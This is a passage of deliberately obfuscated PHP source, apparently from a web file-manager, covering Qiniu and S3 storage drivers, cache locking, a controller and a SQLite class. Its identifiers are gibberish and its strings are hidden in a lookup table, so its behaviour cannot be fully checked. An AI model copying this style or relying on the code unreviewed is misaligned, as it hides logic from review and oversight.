= $this->bucketManager->listFiles($this->bucket, $ù»©¸Î¥, $õó „¶ô, $›ø¶‚õ, $×¥ŸË»£); if ($º­¬¼±†) { break; } $õó „¶ô = array_key_exists($„ÜÆáÕ©[1404], $Ü¾‹äı) ? $õó „¶ô = $Ü¾‹äı[$„ÜÆáÕ©[1437]] : $„ÜÆáÕ©[12]; $ÒíÁ¡ã = isset($Ü¾‹äı[$„ÜÆáÕ©[1438]]) ? $Ü¾‹äı[$„ÜÆáÕ©[1438]] : array(); $Ä­ê¡¸Í = isset($Ü¾‹äı[$„ÜÆáÕ©[1439]]) ? $Ü¾‹äı[$„ÜÆáÕ©[1439]] : array(); foreach ($ÒíÁ¡ã as $¾ÏáÈ¬Œ) { if ($¾ÏáÈ¬Œ[$„ÜÆáÕ©[94]] == $ù»©¸Î¥) { continue; } $–ŒúÀ  = $¾ÏáÈ¬Œ[$„ÜÆáÕ©[94]]; $´È‹Óä = $¾ÏáÈ¬Œ[$„ÜÆáÕ©[1435]]; $¾ÏáÈ¬Œ[$„ÜÆáÕ©[76]] = $´È‹Óä; $§¦ïŸÏß = $´È‹Óä == 0 && substr($–ŒúÀ , strlen($–ŒúÀ ) - 1, 1) == $„ÜÆáÕ©[8] ? !0 : !1; $this->cacheMethodInfoSet($–ŒúÀ , $§¦ïŸÏß, $¾ÏáÈ¬Œ); if ($§¦ïŸÏß) { $×ó¹¼èœ[] = $–ŒúÀ ; continue; } $çõ‹š¶°[] = $çÓö´âÔ ? $¾ÏáÈ¬Œ : $–ŒúÀ ; } foreach ($Ä­ê¡¸Í as $–ŒúÀ ) { if ($–ŒúÀ  == $ù»©¸Î¥) { continue; } $×ó¹¼èœ[] = $–ŒúÀ ; $this->cacheMethodInfoSet($–ŒúÀ , !0); } if ($õó „¶ô === $„ÜÆáÕ©[12]) { break; } } $this->cacheMethodInfoSet($ì¯—‰ÑØ, !0); return array($„ÜÆáÕ©[82] => $×ó¹¼èœ, $„ÜÆáÕ©[83] => $çõ‹š¶°); } public function canRead($ìÄë·İ‡) { return $this->exist($ìÄë·İ‡) ? !0 : !1; } public function canWrite($ò˜Ï¥³È) { return $this->exist($ò˜Ï¥³È) ? !0 : !1; } public function getContent($÷ë° èá) { return $this->fileSubstr($÷ë° èá, 0, -1); } public function setContent($ìÁ×¼¢­, $‰–ÂÍá = '') { $«ôÊı‹É = $this->tempFile($this->pathThis($ìÁ×¼¢­)); file_put_contents($«ôÊı‹É, $‰–ÂÍá); if ($this->upload($ìÁ×¼¢­, $«ôÊı‹É)) { $this->tempFileRemve($«ôÊı‹É); return !0; } return !1; } public function refreshUrls($åè­†é¤) { $å„ş³¸† =& $_SERVER[™¾ÇÙ¯¹]; $±ßÍ¢¨ã = array(); if (is_array($åè­†é¤)) { foreach ($åè­†é¤ as $§ÕÖ²ø·) { $±ßÍ¢¨ã[] = $this->link($§ÕÖ²ø·); } } else { $±ßÍ¢¨ã[] = $this->link($åè­†é¤); } $êÊ³âÒô = new Qiniu\Cdn\CdnManager($this->auth); list($–®æêÓ’, $ÖˆÒŒÕ™) = $êÊ³âÒô->refreshUrls($±ßÍ¢¨ã); if ($ÖˆÒŒÕ™) { return !1; } return $–®æêÓ’[$å„ş³¸†[1191]] == $å„ş³¸†[775] ? !0 : !1; } public function fileSubstr($Ì®ü°Í˜, $®ˆ”—â–, $Œ Ç¥É) { $ûÑ¡¿‘Ö =& $_SERVER[™¾ÇÙ¯¹]; if (!($›ØŞù‰Ş = $this->link($Ì®ü°Í˜))) { return !1; } $è¨³ì–¯ = !1; if ($Œ Ç¥É > 0) { $ÌÃì¬—å = $®ˆ”—â– + $Œ Ç¥É - 1; $è¨³ì–¯ = array($ûÑ¡¿‘Ö[1440] . $®ˆ”—â– . $ûÑ¡¿‘Ö[394] . $ÌÃì¬—å); } $§ë…ÎãÒ = url_request($›ØŞù‰Ş, $ûÑ¡¿‘Ö[230], !1, $è¨³ì–¯); return $§ë…ÎãÒ[$ûÑ¡¿‘Ö[765]] ? $§ë…ÎãÒ[$ûÑ¡¿‘Ö[1201]] : !1; } public function upload($¼†öÆŠ°, $ô‰øîÎë, $”š•ÍË = false, $…Öü¤×ƒ = REPEAT_REPLACE) { $Ü¬´ô…› = new Qiniu\Storage\UploadManager(); $Ÿ†şŸ†… = $this->auth->uploadToken($this->bucket, $¼†öÆŠ°); $Åğááô = get_file_mime(get_path_ext($ô‰øîÎë)); list($ºøÀ²¶, $ÁşµÒšæ) = $Ü¬´ô…›->putFile($Ÿ†şŸ†…, $¼†öÆŠ°, $ô‰øîÎë, null, $Åğááô); return $ÁşµÒšæ ? !1 : $this->getPathOuter($¼†öÆŠ°); } public function uploadFormData($È±Ì“’¥, $¶Ş¹—â = 3600) { return $this->uploadToken($È±Ì“’¥, $¶Ş¹—â); } public function multiUploadFormData($†¡˜Æ†€, $‚¿Ù¦ÉÙ = 3600) { return $this->uploadToken($†¡˜Æ†€, $‚¿Ù¦ÉÙ); } private function uploadToken($÷âœ´ú•, $ã£‘÷ŸÃ = 3600) { $ää¿àßÄ =& $_SERVER[™¾ÇÙ¯¹]; $«ªˆœªŞ = $ã£‘÷ŸÃ; $åêØà«• = array($ää¿àßÄ[1441] => $ää¿àßÄ[1442]); $Úú úµ— = $÷âœ´ú•; $Œ°—Šµí = $this->auth->uploadToken($this->bucket, $Úú úµ—, $«ªˆœªŞ, $åêØà«•, !0); $ìøıÊ©é = empty($this->region) || $this->region == $ää¿àßÄ[1443] ? $ää¿àßÄ[12] : $ää¿àßÄ[394] . $this->region; $¥ÃúÂšÈ = http_type() . "\72\57\57\x75\160\x6c\x6f\x61\144{$ìøıÊ©é}\56\x71\151\x6e\151\x75\160\56\x63\x6f\155\57"; return array($ää¿àßÄ[1444] => $Œ°—Šµí, $ää¿àßÄ[1445] => $¥ÃúÂšÈ); } public function download($ç¶¶œ˜€, $ŸÀüé¡š) { $¨«…‰† = IO::getPathInner(IO::mkfile($ŸÀüé¡š)); if (!($ªê äÊÄ = $this->link($ç¶¶œ˜€))) { return !1; } $ÚÏÂ˜ÈÄ = 0; $õ©£òÉç = 1024 * 200; $¡õÃ° = fopen($¨«…‰†, $_SERVER[™¾ÇÙ¯¹][1446]); while (!0) { $°˜Ì®ùª = $this->fileSubstr($ç¶¶œ˜€, $ÚÏÂ˜ÈÄ, $õ©£òÉç); if ($°˜Ì®ùª === !1) { return !1; } fwrite($¡õÃ°, $°˜Ì®ùª); $ÚÏÂ˜ÈÄ += $õ©£òÉç; if (strlen($°˜Ì®ùª) < $õ©£òÉç) { break; } } fclose($¡õÃ°); return $ŸÀüé¡š; } public function link($úûüÍ‡, $¦ç‰ªœç = '') { if (!$this->isFile($úûüÍ‡)) { return !1; } $´¢ÙÙŞ‰ = $this->getHost() . $_SERVER[™¾ÇÙ¯¹][8] . $this->pathEncode($úûüÍ‡) . $¦ç‰ªœç; return $this->auth->privateDownloadUrl($´¢ÙÙŞ‰, 3600 * 12); } public function fileOut($šÏŞäÏ, $ïÔÖÜ›€ = false, $Óã³Û‘¡ = false, $Ï²‹ÅÉ½ = '') { $Â„²Ò© =& $_SERVER[™¾ÇÙ¯¹]; if ($this->isFileOutServer()) { return $this->fileOutServer($šÏŞäÏ, $ïÔÖÜ›€, $Óã³Û‘¡, $Ï²‹ÅÉ½); } if (!$Óã³Û‘¡) { $Óã³Û‘¡ = $this->pathThis($šÏŞäÏ); } $Ñ§Ëüğ = $ïÔÖÜ›€ ? $Â„²Ò©[1447] . rawurlencode($Óã³Û‘¡) : $Â„²Ò©[12]; $ÍÌµÚ›Ø = $this->link($šÏŞäÏ, $Ñ§Ëüğ); $this->fileOutLink($ÍÌµÚ›Ø); } public function fileOutServer($ŒÌÈõÂƒ, $£ÄÂñÆ = false, $Ìı—¥± = false, $Â¾ÆèÅ½ = '') { parent::fileOut($ŒÌÈõÂƒ, $£ÄÂñÆ, $Ìı—¥±, $Â¾ÆèÅ½); } public function fileOutImage($Õ‰ó³€Å, $–¤¶¾„ = 250) { $Õ‘æÊÅ¬ = $this->link($Õ‰ó³€Å, $_SERVER[™¾ÇÙ¯¹][1448] . $–¤¶¾„); $this->fileOutLink($Õ‘æÊÅ¬); } public function fileOutImageServer($¸‹ªğî”, $±œûŞâ® = 250) { parent::fileOutImage($¸‹ªğî”, $±œûŞâ®); } public function hashMd5($¬»áº¯Œ) { $‚Æ“¹Ï» =& $_SERVER[™¾ÇÙ¯¹]; $¡ÄÆáÁş = $this->objectMeta($¬»áº¯Œ); return isset($¡ÄÆáÁş[$‚Æ“¹Ï»[212]]) ? $¡ÄÆáÁş[$‚Æ“¹Ï»[212]] : !1; $’õ‡— = $this->link($¬»áº¯Œ, $‚Æ“¹Ï»[1449]); } public function size($ûñ¥÷) { $âÄúûïÚ = $this->objectMeta($ûñ¥÷); return $âÄúûïÚ ? $âÄúûïÚ[$_SERVER[™¾ÇÙ¯¹][76]] : 0; } public function info($«ş³¹ÌŠ) { if ($this->isFolder($«ş³¹ÌŠ)) { return $this->folderInfo($«ş³¹ÌŠ); } else { if ($this->isFile($«ş³¹ÌŠ)) { return $this->fileInfo($«ş³¹ÌŠ); } } return !1; } public function exist($Õ®ÈÊ§Ÿ) { return $this->isFile($Õ®ÈÊ§Ÿ) || $this->isFolder($Õ®ÈÊ§Ÿ); } public function isFile($™Ûè¿µ²) { return !$this->isFolder($™Ûè¿µ²) && $this->objectMeta($™Ûè¿µ²); } public function isFolder($—Ö¤¦¤) { return $this->cacheMethod($_SERVER[™¾ÇÙ¯¹][165], $—Ö¤¦¤); } protected function objectMeta($à²—âı²) { return $this->cacheMethod($_SERVER[™¾ÇÙ¯¹][167], $à²—âı²); } protected function _objectMeta($²¾ÊÂ—­) { $Å›¹«»¼ =& $_SERVER[™¾ÇÙ¯¹]; list($Ú„¡‡‘ì, $—Ş¬øµ÷) = $this->bucketManager->stat($this->bucket, $²¾ÊÂ—­); if ($Ú„¡‡‘ì) { $Ú„¡‡‘ì[$Å›¹«»¼[76]] = intval($Ú„¡‡‘ì[$Å›¹«»¼[1435]]); } return $Ú„¡‡‘ì; } protected function _isFolder($¦ òÓÀ¨) { $Úš«Ø¼ë =& $_SERVER[™¾ÇÙ¯¹]; if ($¦ òÓÀ¨ == $Úš«Ø¼ë[12] || $¦ òÓÀ¨ == $Úš«Ø¼ë[8]) { return !0; } list($õ¿äãã², $ÅÄ”ê£à) = $this->bucketManager->listFiles($this->bucket, trim($¦ òÓÀ¨, $Úš«Ø¼ë[8]) . $Úš«Ø¼ë[8], $Úš«Ø¼ë[12], 1, $Úš«Ø¼ë[8]); return !empty($õ¿äãã²[$Úš«Ø¼ë[1438]]) || !empty($õ¿äãã²[$Úš«Ø¼ë[1439]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¥‹µóğ®) { parent::__construct($¥‹µóğ®); } public function uploadFormData($Êí¥ÂÊ, $İõéËÕ— = 3600) { $òš°Ô«– =& $_SERVER[™¾ÇÙ¯¹]; $È»ÅÚÁ = $òš°Ô«–[198]; $ÉË ´–Ó = $òš°Ô«–[1354]; $¢¬¡†¸ = $òš°Ô«–[62]; $á”‹Ö¤Ô = gmdate($òš°Ô«–[1355]); $Ö†‘Şó = gmdate($òš°Ô«–[766]); $©ó¸¥ = $òš°Ô«–[1356]; $¼ùûÒ›è = $İõéËÕ— . $òš°Ô«–[12]; $òîÎ§ä½ = $òš°Ô«–[1318]; $£ğ›¶ = array($this->accessKey, $Ö†‘Şó, $this->region, $¢¬¡†¸, $©ó¸¥); $©á¡™Ğ¢ = implode($òš°Ô«–[8], $£ğ›¶); $ù¥êÈÕ = array($òš°Ô«–[1320] => gmdate($òš°Ô«–[1319], strtotime($òš°Ô«–[1357])), $òš°Ô«–[1321] => array(array($òš°Ô«–[1323] => $this->bucket), array($òš°Ô«–[1322] => $È»ÅÚÁ), array($òš°Ô«–[1324], $òš°Ô«–[1325], $òš°Ô«–[12]), array($òš°Ô«–[1324], $òš°Ô«–[1358], $òš°Ô«–[12]), array($òš°Ô«–[1324], $òš°Ô«–[1359], $òš°Ô«–[12]), array($òš°Ô«–[1326] => $òîÎ§ä½), array($òš°Ô«–[1360] => $©á¡™Ğ¢), array($òš°Ô«–[1361] => $ÉË ´–Ó), array($òš°Ô«–[1362] => $á”‹Ö¤Ô), array($òš°Ô«–[1363] => $¼ùûÒ›è))); $ÉÚÉü† = base64_encode(json_encode($ù¥êÈÕ)); $Ò„óöë = hash_hmac($òš°Ô«–[1364], $Ö†‘Şó, $òš°Ô«–[1365] . $this->secret, !0); $ÙÚ‘®¢µ = hash_hmac($òš°Ô«–[1364], $this->region, $Ò„óöë, !0); $Üêœ·°ö = hash_hmac($òš°Ô«–[1364], $¢¬¡†¸, $ÙÚ‘®¢µ, !0); $Ö¢‚šÛî = hash_hmac($òš°Ô«–[1364], $©ó¸¥, $Üêœ·°ö, !0); $ı›Şàœ = hash_hmac($òš°Ô«–[1364], $ÉÚÉü†, $Ö¢‚šÛî); $”Ì¢â× = array($òš°Ô«–[215] => $òš°Ô«–[12], $òš°Ô«–[1366] => $òš°Ô«–[12], $òš°Ô«–[1322] => $È»ÅÚÁ, $òš°Ô«–[1326] => $òîÎ§ä½, $òš°Ô«–[1330] => $ÉÚÉü†, $òš°Ô«–[1367] => $©á¡™Ğ¢, $òš°Ô«–[1368] => $ÉË ´–Ó, $òš°Ô«–[1369] => $á”‹Ö¤Ô, $òš°Ô«–[1370] => $¼ùûÒ›è, $òš°Ô«–[1371] => $ı›Şàœ, $òš°Ô«–[181] => $this->getHost()); return $”Ì¢â×; } public function multiUploadFormData($¸¾²­İÄ, $äÍú—ß§ = 3600) { $ÙõïûÆŞ =& $_SERVER[™¾ÇÙ¯¹]; $î’€İÖÏ = gmdate($ÙõïûÆŞ[1450]); $Ë×ºúê½ = array(); $ãÇ¼‘Íâ = $this->client->getUploadId($this->bucket, $¸¾²­İÄ, $Ë×ºúê½); if (!$ãÇ¼‘Íâ) { return !1; } return array($ÙõïûÆŞ[223] => $ãÇ¼‘Íâ, $ÙõïûÆŞ[181] => $this->getHost() . $ÙõïûÆŞ[8] . $this->pathEncode($¸¾²­İÄ), $ÙõïûÆŞ[224] => $î’€İÖÏ, $ÙõïûÆŞ[94] => $¸¾²­İÄ); } public function multiUploadAuthData($±Ğ©°¥à, $ú¿’ì•¨ = array()) { $Äé´ãûô =& $_SERVER[™¾ÇÙ¯¹]; $‹÷¦€äË = isset($ú¿’ì•¨[$Äé´ãûô[174]]) ? $ú¿’ì•¨[$Äé´ãûô[174]] : $Äé´ãûô[12]; $úğÁ¿­½ = $ú¿’ì•¨[$Äé´ãûô[94]]; unset($ú¿’ì•¨[$Äé´ãûô[94]]); if (isset($ú¿’ì•¨[$Äé´ãûô[225]])) { return $this->listUploadParts($úğÁ¿­½, $ú¿’ì•¨); } $í•ø÷˜û = array(); if (isset($ú¿’ì•¨[$Äé´ãûô[1451]])) { $í•ø÷˜û[$Äé´ãûô[1452]] = $ú¿’ì•¨[$Äé´ãûô[1451]]; } $©§¬Àô = explode($Äé´ãûô[183], $this->getHost()); $¥Èµáı× = array($Äé´ãûô[1453] => $©§¬Àô[1], $Äé´ãûô[1454] => $Äé´ãûô[12], $Äé´ãûô[215] => $Äé´ãûô[120], $Äé´ãûô[1366] => $ú¿’ì•¨[$Äé´ãûô[76]]); $Ûƒ©·ƒÕ = $Äé´ãûô[228]; $¹—©¾§ = $Äé´ãûô[8] . $this->pathEncode($úğÁ¿­½) . $‹÷¦€äË; $‰×Ì÷¢ô = $this->client->__getSignatureV4($í•ø÷˜û, $¥Èµáı×, $Ûƒ©·ƒÕ, $¹—©¾§); if (strpos($‹÷¦€äË, $Äé´ãûô[227]) === 0) { if (isset($í•ø÷˜û[$Äé´ãûô[1452]])) { $ñë¯ŠµË = $í•ø÷˜û[$Äé´ãûô[1452]]; } else { if (isset($‰×Ì÷¢ô[$Äé´ãûô[1452]])) { $ñë¯ŠµË = $‰×Ì÷¢ô[$Äé´ãûô[1452]]; } else { $ñë¯ŠµË = hash($Äé´ãûô[1364], $Äé´ãûô[12]); } } return array($Äé´ãûô[234] => $‰×Ì÷¢ô[$Äé´ãûô[234]], $Äé´ãûô[1452] => $ñë¯ŠµË, $Äé´ãûô[224] => $‰×Ì÷¢ô[$Äé´ãûô[1455]]); } return $‰×Ì÷¢ô[$Äé´ãûô[234]]; } public function listUploadParts($×Ô¤û´, $ºÖ ®ß­ = array()) { $ì•‘ÓÍ½ =& $_SERVER[™¾ÇÙ¯¹]; $ËÚæõ‹ = str_replace($ì•‘ÓÍ½[235], $ì•‘ÓÍ½[12], $ºÖ ®ß­[$ì•‘ÓÍ½[174]]); $õĞôÒş¹ = $this->client->listParts($this->bucket, $×Ô¤û´, $ËÚæõ‹); if (!$õĞôÒş¹) { return !1; } $’—²‹‡ = $ì•‘ÓÍ½[1456]; foreach ($õĞôÒş¹ as $¡®Ìá—Ï) { $’—²‹‡ .= $ì•‘ÓÍ½[1457] . "\x3c\120\x61\x72\x74\x4e\165\x6d\x62\x65\162\76{$¡®Ìá—Ï[$ì•‘ÓÍ½[1411]]}\x3c\57\120\x61\162\164\x4e\x75\x6d\x62\145\162\76\12" . "\74\105\124\x61\x67\x3e{$¡®Ìá—Ï[$ì•‘ÓÍ½[1412]]}\x3c\57\x45\124\141\147\76\xa" . $ì•‘ÓÍ½[1458]; } $’—²‹‡ .= $ì•‘ÓÍ½[1459]; $Ü¥«ıƒ = array(); $î¸½«åÑ = explode($ì•‘ÓÍ½[183], $this->getHost()); $§â¤‚ö = array($ì•‘ÓÍ½[1453] => $î¸½«åÑ[1], $ì•‘ÓÍ½[215] => $ì•‘ÓÍ½[120], $ì•‘ÓÍ½[1366] => strlen($’—²‹‡)); $£‚Ã²³ = $ì•‘ÓÍ½[226]; $…«­İ¯ = $ì•‘ÓÍ½[8] . $this->pathEncode($×Ô¤û´) . $ºÖ ®ß­[$ì•‘ÓÍ½[174]]; $óş¾úË = $this->client->__getSignatureV4($Ü¥«ıƒ, $§â¤‚ö, $£‚Ã²³, $…«­İ¯, $’—²‹‡); return array($ì•‘ÓÍ½[234] => $óş¾úË[$ì•‘ÓÍ½[234]], $ì•‘ÓÍ½[224] => $óş¾úË[$ì•‘ÓÍ½[1455]], $ì•‘ÓÍ½[236] => $õĞôÒş¹, $ì•‘ÓÍ½[1452] => $óş¾úË[$ì•‘ÓÍ½[1452]]); } public function link($È´Éñ¹¨, $ØÓÍœ¶¤ = array()) { return parent::link($È´Éñ¹¨, $ØÓÍœ¶¤); } public function fileOut($˜ìÏë¾, $ûß¨äËå = false, $íğ›¦œÆ = false, $…‡×Ç¿ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[™¾ÇÙ¯¹][1460])) { return parent::fileOutServer($˜ìÏë¾, $ûß¨äËå, $íğ›¦œÆ, $…‡×Ç¿); } parent::fileOut($˜ìÏë¾, $ûß¨äËå, $íğ›¦œÆ, $…‡×Ç¿); } public function fileOutImage($‚ÛµŒüî, $¿™’½ıì = 250) { if (strstr($this->endpoint, $_SERVER[™¾ÇÙ¯¹][1460])) { return parent::fileOutImageServer($‚ÛµŒüî, $¿™’½ıì); } parent::fileOutImage($‚ÛµŒüî, $¿™’½ıì); } public function fileOutLink($Ÿª‹äÊ) { $ÁÊëÉ¾ô =& $_SERVER[™¾ÇÙ¯¹]; if (substr($Ÿª‹äÊ, 0, 7) == $ÁÊëÉ¾ô[1333]) { $Ÿª‹äÊ = $ÁÊëÉ¾ô[1334] . substr($Ÿª‹äÊ, 7); } header($ÁÊëÉ¾ô[161] . $Ÿª‹äÊ); die; } public function getHost() { $µÛÙªúï =& $_SERVER[™¾ÇÙ¯¹]; $îØ£¢ƒÑ = str_rtrim(parent::getHost(), $µÛÙªúï[8] . $this->bucket); $îØ£¢ƒÑ = explode($µÛÙªúï[183], $îØ£¢ƒÑ); return $îØ£¢ƒÑ[0] . $µÛÙªúï[183] . $this->bucket . $µÛÙªúï[10] . $îØ£¢ƒÑ[1]; } } goto aëîÊ§ôŒï; F…ìëÉ±Õ: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $©ı³æ£ =& $_SERVER[™¾ÇÙ¯¹]; $ˆÌ§Ê…İ = $GLOBALS[$©ı³æ£[6]][$©ı³æ£[358]]; self::$cachePath = $ˆÌ§Ê…İ[$©ı³æ£[199]][$©ı³æ£[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¶œ½¾†, $Ä˜—µè = 0) { $äÓÚÅôÜ =& $_SERVER[™¾ÇÙ¯¹]; $Ñç†äÂ¸ = microtime(!0); $¡üãÃ¨å = $Ñç†äÂ¸ + $Ä˜—µè + 0.0001; $ƒä¿·¸ø = rtrim(self::$cachePath, $äÓÚÅôÜ[8]) . $äÓÚÅôÜ[874] . md5($¶œ½¾†) . $äÓÚÅôÜ[871]; if (file_exists($ƒä¿·¸ø) && filemtime($ƒä¿·¸ø) && filemtime($ƒä¿·¸ø) < time() - 10) { @unlink($ƒä¿·¸ø); } do { if (file_exists($ƒä¿·¸ø)) { cacheLockWait(); continue; } $‡¼™¯¾„ = fopen($ƒä¿·¸ø, $äÓÚÅôÜ[875]); if (!$‡¼™¯¾„) { return !1; } $ôÃ–ñ½¬ = flock($‡¼™¯¾„, LOCK_EX | LOCK_NB); self::$caches[$¶œ½¾†] = array($äÓÚÅôÜ[876] => $‡¼™¯¾„, $äÓÚÅôÜ[199] => $ƒä¿·¸ø); fwrite($‡¼™¯¾„, $¡üãÃ¨å); clearstatcache(); if ($‡¼™¯¾„ && $ôÃ–ñ½¬) { return !0; } cacheLockWait(); } while (microtime(!0) < $¡üãÃ¨å); $this->unlock($¶œ½¾†); return !1; } public function lockGet($ÚÅœçõŠ) { $¡ âá¸‰ =& $_SERVER[™¾ÇÙ¯¹]; $èÅ÷¹å = rtrim(self::$cachePath, $¡ âá¸‰[8]) . $¡ âá¸‰[874] . md5($ÚÅœçõŠ) . $¡ âá¸‰[871]; return file_exists($èÅ÷¹å); } public function unlock($ÌŸ±æ–“) { $’·¶¦¾¶ =& $_SERVER[™¾ÇÙ¯¹]; $é„­Ãş« = self::$caches[$ÌŸ±æ–“]; if (!$é„­Ãş«) { return; } @flock($é„­Ãş«[$’·¶¦¾¶[876]], LOCK_UN); @fclose($é„­Ãş«[$’·¶¦¾¶[876]]); @unlink($é„­Ãş«[$’·¶¦¾¶[199]]); unset(self::$caches[$ÌŸ±æ–“]); } } class CacheLockRedis { public function lock($Ü²ãÓ•Ğ, $üç¦Œû = 10) { $òŒø“‚Š = Cache::init(); $ŠŞéŒ©Œ = microtime(!0) + $üç¦Œû; while (microtime(!0) < $ŠŞéŒ©Œ) { $ıò³Ö§¤ = $òŒø“‚Š->get($Ü²ãÓ•Ğ); if (!$ıò³Ö§¤) { $õ„¼Û = $òŒø“‚Š->setLock($Ü²ãÓ•Ğ, $ŠŞéŒ©Œ, $üç¦Œû); if ($õ„¼Û) { return !0; } } else { if ($ıò³Ö§¤ < microtime(!0)) { $òŒø“‚Š->set($Ü²ãÓ•Ğ, $ŠŞéŒ©Œ, $üç¦Œû * 2); if ($òŒø“‚Š->get($Ü²ãÓ•Ğ) === $ıò³Ö§¤) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($„Áû…ÉÂ) { return Cache::init()->get($„Áû…ÉÂ); } public function unlock($Ã®£¿ø‡) { return Cache::init()->remove($Ã®£¿ø‡); } } goto C‚Û‡ÚÂ¡»; C£‡‡©°¡: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ŞÅ®Ä€¯ =& $_SERVER[™¾ÇÙ¯¹]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ŞÅ®Ä€¯[6]] =& $config; $this->values[$ŞÅ®Ä€¯[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ŞÅ®Ä€¯[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($··¡ßÇÍ) { if (1 === func_num_args()) { $this->{$··¡ßÇÍ} = new $··¡ßÇÍ(); } else { $­˜«î¨ñ = new ReflectionClass($··¡ßÇÍ); $Ÿ¶ğ¾ê = func_get_args(); array_shift($Ÿ¶ğ¾ê); $this->{$··¡ßÇÍ} = $­˜«î¨ñ->newInstanceArgs($Ÿ¶ğ¾ê); } return $this->{$··¡ßÇÍ}; } public function routeBind($ÛÜäàâ, $ ğª¬»å, $ï–ÑáÌî = 3) { $ùÙÉ‡¾´ =& $_SERVER[™¾ÇÙ¯¹]; $‹êìÕ“ = $this->in[$ùÙÉ‡¾´[9]]; $ÛÜäàâ = str_replace($ùÙÉ‡¾´[10], $ùÙÉ‡¾´[11], trim(trim($ÛÜäàâ, $ùÙÉ‡¾´[8]), $ùÙÉ‡¾´[12])); if (!$ÛÜäàâ || count($‹êìÕ“) <= $ï–ÑáÌî) { return !1; } $ú‘¾ÏüØ = !0; $‘™ÀÅ³Á = explode($ùÙÉ‡¾´[8], $ÛÜäàâ); for ($ŸñÜ–À¨ = 0; $ŸñÜ–À¨ < count($‘™ÀÅ³Á); $ŸñÜ–À¨++) { if ($‘™ÀÅ³Á[$ŸñÜ–À¨] != $‹êìÕ“[$ï–ÑáÌî + $ŸñÜ–À¨]) { $ú‘¾ÏüØ = !1; break; } } if (!$ú‘¾ÏüØ) { return; } call_user_func_array(array($this, $ ğª¬»å), array()); } public function routeArgs($ÅõúÚÉî = 3) { $‹«áªê = $this->in[$_SERVER[™¾ÇÙ¯¹][9]]; if (count($‹«áªê) <= $ÅõúÚÉî) { return array(); } $á†­µµ = array(); for ($ùàç¯‹ = $ÅõúÚÉî; $ùàç¯‹ < count($‹«áªê); $ùàç¯‹ += 2) { $á†­µµ[$‹«áªê[$ùàç¯‹]] = $‹«áªê[$ùàç¯‹ + 1]; $this->in[$‹«áªê[$ùàç¯‹]] = $‹«áªê[$ùàç¯‹ + 1]; } return $á†­µµ; } protected function assign($®¶ÂĞ¢î, $ğôÆĞÍ) { $this->values[$®¶ÂĞ¢î] = $ğôÆĞÍ; } protected function display($¦±¿®«ß) { ob_end_clean(); extract($this->values); require $this->tpl . $¦±¿®«ß; } } class DbSqliteBase extends Db { public function __construct($ŸÛçëõ = '') { $ïñş ì¼ =& $_SERVER[™¾ÇÙ¯¹]; if (!extension_loaded($ïñş ì¼[13])) { think_exception(think_lang($ïñş ì¼[14]) . $ïñş ì¼[15]); } if (!empty($ŸÛçëõ)) { if (!isset($ŸÛçëõ[$ïñş ì¼[16]])) { $ŸÛçëõ[$ïñş ì¼[16]] = 438; } $this->config = $ŸÛçëõ; if (empty($this->config[$ïñş ì¼[17]])) { $this->config[$ïñş ì¼[17]] = array(); } } } public function connect($ùÖ¸†¡Ì = '', $Ş¨Ì•¹· = 0) { $¾Â•ªû… =& $_SERVER[™¾ÇÙ¯¹]; if (!isset($this->linkID[$Ş¨Ì•¹·])) { if (empty($ùÖ¸†¡Ì)) { $ùÖ¸†¡Ì = $this->config; } $ÖåöºÅÒ = !empty($ùÖ¸†¡Ì[$¾Â•ªû…[17]][$¾Â•ªû…[18]]) ? $ùÖ¸†¡Ì[$¾Â•ªû…[17]][$¾Â•ªû…[18]] : $this->pconnect; $ëúŠ°÷ = $ÖåöºÅÒ ? $¾Â•ªû…[19] : $¾Â•ªû…[20]; $this->linkID[$Ş¨Ì•¹·] = $ëúŠ°÷($ùÖ¸†¡Ì[$¾Â•ªû…[21]], $ùÖ¸†¡Ì[$¾Â•ªû…[16]]); if (!$this->linkID[$Ş¨Ì•¹·]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Ş¨Ì•¹·], 30000); if (1 != think_config($¾Â•ªû…[22])) { unset($this->config); } } return $this->linkID[$Ş¨Ì•¹·]; } public function free() { $this->queryID = null; } public function query($¡Âëäºª) { $íŞ®°ÂØ =& $_SERVER[™¾ÇÙ¯¹]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¡Âëäºª; if ($this->queryID) { $this->free(); } think_action_status($íŞ®°ÂØ[23], 1); think_status($íŞ®°ÂØ[24]); $this->queryID = sqlite_query($this->_linkID, $¡Âëäºª); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $„·Â„ôí = $this->getAll(); return $„·Â„ôí; } } public function execute($–†Û×ßÈ) { $ü¯ûÀŞÊ =& $_SERVER[™¾ÇÙ¯¹]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $–†Û×ßÈ; if ($this->queryID) { $this->free(); } think_action_status($ü¯ûÀŞÊ[25], 1); think_status($ü¯ûÀŞÊ[24]); $”Ä²ó× = sqlite_exec($this->_linkID, $–†Û×ßÈ); $this->debug(); if (!1 === $”Ä²ó×) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[™¾ÇÙ¯¹][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Âàßª´¾ = sqlite_query($this->_linkID, $_SERVER[™¾ÇÙ¯¹][27]); if (!$Âàßª´¾) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÓåŒâÇ = sqlite_query($this->_linkID, $_SERVER[™¾ÇÙ¯¹][28]); if (!$ÓåŒâÇ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { 